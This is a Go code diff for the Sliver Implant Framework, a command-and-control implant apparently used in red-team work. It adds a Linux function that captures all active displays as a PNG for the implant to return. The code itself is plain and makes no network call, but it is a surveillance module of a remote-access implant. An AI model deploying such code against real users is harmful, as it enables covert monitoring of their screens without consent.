@@ -1,4 +1,4 @@
-package screenshot
+package screen
 
 /*
 	Sliver Implant Framework
@@ -18,8 +18,47 @@ package screenshot
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
+import (
+	"bytes"
+	"image/png"
+
+	//{{if .Config.Debug}}
+	"log"
+	//{{end}}
+	screen "github.com/kbinani/screenshot"
+)
+
 //Screenshot - Retrieve the screenshot of the active displays
 func Screenshot() []byte {
+	return LinuxCapture()
+}
 
-	return Capture()
+// LinuxCapture - Retrieve the screenshot of the active displays
+func LinuxCapture() []byte {
+	nDisplays := screen.NumActiveDisplays()
+
+	var height, width int = 0, 0
+	for i := 0; i < nDisplays; i++ {
+		rect := screen.GetDisplayBounds(i)
+		if rect.Dy() > height {
+			height = rect.Dy()
+		}
+		width += rect.Dx()
+	}
+	img, err := screen.Capture(0, 0, width, height)
+
+	//{{if .Config.Debug}}
+	log.Printf("Error Capture: %s", err)
+	//{{end}}
+
+	var buf bytes.Buffer
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Println("Capture Error")
+		//{{end}}
+		return buf.Bytes()
+	}
+
+	png.Encode(&buf, img)
+	return buf.Bytes()
 }
